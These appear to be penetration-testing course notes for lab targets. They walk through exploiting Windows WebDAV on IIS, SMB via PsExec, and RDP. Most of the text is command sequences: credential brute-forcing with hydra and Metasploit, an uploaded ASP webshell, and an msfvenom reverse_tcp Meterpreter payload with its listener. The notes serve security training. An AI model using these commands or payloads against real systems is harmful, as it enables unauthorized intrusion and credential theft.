# System and Host Based Attacks

## Exploiting Windows Vulnerabilities

### Exploiting Microsoft WEBDAV Service

**Microsoft IIS**
IIS (Internet Information Services) is a proprietary extensible web server software developed by Microsoft for use with the Windows NT family. It can be used to host websites/web apps and provides administrators with a robust GUI for managing websites. IIS can be used to host both static and dynamic web pages developed in ASP.NET and PHP. Typically configured to run on ports 80/443.
Supported executable file extensions:.asp, .aspx, .config, .php

**WEBDAV**
WebDAV (Web-based Distributed Authoring and Versioning) is a set of extensions to the HTTP protocol which allow users to collaboratively edit and manage files on remote web servers. WebDAV essentially enables a web server to function as a file server for collaborative authoring. WebDAV runs on top Microsoft IIS on ports 80/443. In order to connect to a WebDAV server, you will need to provide legitimate credentials. This is because WebDAV implements authentication in the form of a username and password.

**WebDAV Exploitation**
The first step of the exploitation process will involve identifying whether WebDAV has been configured to run on the IIS web server. We can perform a brute-force attack on the WebDAV server in order to identify legitimate credentials that we can use for authentication. After obtaining legitimate credentials, we can authenticate with the WebDAV server and upload a malicious .asp payload that can be used to execute arbitrary commands or obtain a reverse shell on the target.

**Tools**

- davtest - Used to scan, authenticate and exploit a WebDAV server. Is Pre-installed on most offensive penetration testing distributions like Kali and Parrot OS.
- cadaver - cadaver supports file upload, download, on-screen display, in-place editing, namespace operations (move/copy), collection creation and deletion, property manipulation, and resource locking on WebDAV servers. Is Pre-installed on most offensive penetration testing distributions like Kali and Parrot OS.

### Exploiting Microsoft WEBDAV Service Practical

- `ping demo.ine.local`
- `nmap -sV -sC 10.2.20.234`
- `nmap -sV -p 80 --script=http-enum 10.2.20.234` Use script to tell us whether we have the webdav directory and if webdav is configured on this webserver.
- `davtest -url http://10.2.20.234/webdav` Failed because Unauthorized credentials
- `davtest -auth bob:password_123321 -url http://10.2.20.234/webdav`
- `cadaver http://10.2.20.234/webdav`
- `ls -al /usr/share/webshells/`
- `put /usr/share/webshells/asp/webshell.asp`
- go to Website and execute the webshell.asp file we have just uploaded
- `dir C:\`
- `type C:\flag.txt`

### Practical Exploiting WebDAV With Metasploit

- `nmap -sV -p 80 --script=http-enum demo.ine.local`

**Obtain a Meterpreter session**

- `msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.37.7 LPORT=1234 -f asp > shell.asp` (`-p` = payload `-f` = fileformat)  Generate ASP payload
- `cadaver http://10.2.24.226/webdav` afterwards type in username and passwort
- `put /root/shell.asp` Paste asp file on webserver. The next step would be to connect to the webserver and execute it. But before we can do this, we need a listener or a handler that will receive the reverse connection and then send the stage that will then provide us with the meterpreter session when executed. 

### Use Multihandler as listener

- `service postgresql start`
- `msfconsole`
- `use multi/handler`
- `set payload windows/meterpreter/reverse_tcp` This has to be the same Payload that you had specified generating the actual asp file.
- `options`
- `set LHOST 10.10.37.7`
- `set LPORT 1234`
- `run` Start listener(reverse TCP handler) and waits for a connection from the actual asp payload we have created. 

### Run metasploit framework and exploit the target using the IIS webdav exploit module.

- `service postgresql start`
- `msfconsole`
- `use exploit/windows/iis/iis_webdav_upload_asp`
- `set RHOSTS demo.ine.local`
- `set HttpUsername bob`
- `set HttpPassword password_123321`
- `set PATH /webdav/metasploit%RAND%.asp`
- `exploit`
After We have got a Meterpreter session:
- `shell` open shell
- `cd /`
- `dir`
- `type flag.txt` This reveals the flag to us.

### Exploiting SMB With PsExec

SMB (Server Message Block) is a network file sharing protocol that is used to facilitate the sharing of files and peripherals between computers on a LAN. SMB uses port 445 (TCP). However, originally, SMB ran on top of NetBIOS using port 139. SAMBA is the open source Linux implementation of SMB, and allows Windows systems to access Linux shares and devices.

PsExec is a lightweight telnet-replacement developed by Microsoft that allows you execute processes on remote windows systems using any user’s credentials. PsExec authentication is performed via SMB. We can use the PsExec utility to authenticate with the target system legitimately and run arbitrary commands or launch a remote command prompt. It is very similar to RDP, however, instead of controlling the remote system via GUI, commands are sent via CMD.

In order to utilize PsExec to gain access to a Windows target, we will need to identify legitimate user accounts and their respective passwords or password hashes. This can be done by leveraging various tools and techniques, however, the most common technique will involve performing an SMB login brute-force attack. We can narrow down our brute-force attack to only include common Windows user accounts like: Administrator. After we have obtained a legitimate user account and password, we can use the credentials to authenticate with the target system via PsExec and execute arbitrary system commands or obtain a reverse shell.

### Practical Exploiting SMB With PsExec

- `nmap -sV -sC demo.ine.local`
- `service postgresql start && msfconsole`
- `search smb_login`
- `use auxiliary/scanner/smb/smb_login`
- `options`
- `setg RHOSTS 10.2.24.141`
- `set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt`
- `set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt`
- `set VERBOSE false` prints only the successful outputs
- `run` We could identify 4 users with accounts
- `use exploit/windows/smb/psexec`
- `set SMBUser Administrator`
- `set SMBPass qwertyuiop`
- `exploit`
- `shell` open shell
- `cd /`
- `dir`
- `type flag.txt` This reveals the flag to us.

### Exploiting Insecure RDP Service

- `ping demo.ine.local`
- `nmap -sV demo.ine.local` We have discovered that multiple ports are open. RDP default port is 3389. But, we have not discovered that port. We can notice that port 3333 is exposed. We can Identify RDP endpoints using an auxiliary module on port 3333 if it’s running RDP.
- `service postgresql start && msfconsole`
- `use auxiliary/scanner/rdp/rdp_scanner`
- `set RHOSTS demo.ine.local`
- `set RPORT 3333`
- `exploit` --> Detected RDP on 10.2.28.32:3333
- `hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt rdp://demo.ine.local -s 3333` Running the Hydra tool to find a valid username and password from the provided list.
- `xfreerdp /u:administrator /p:qwertyuiop /v:demo.ine.local:3333` We have discovered four valid users and passwords. Access the remote server using xfreerdp tool.
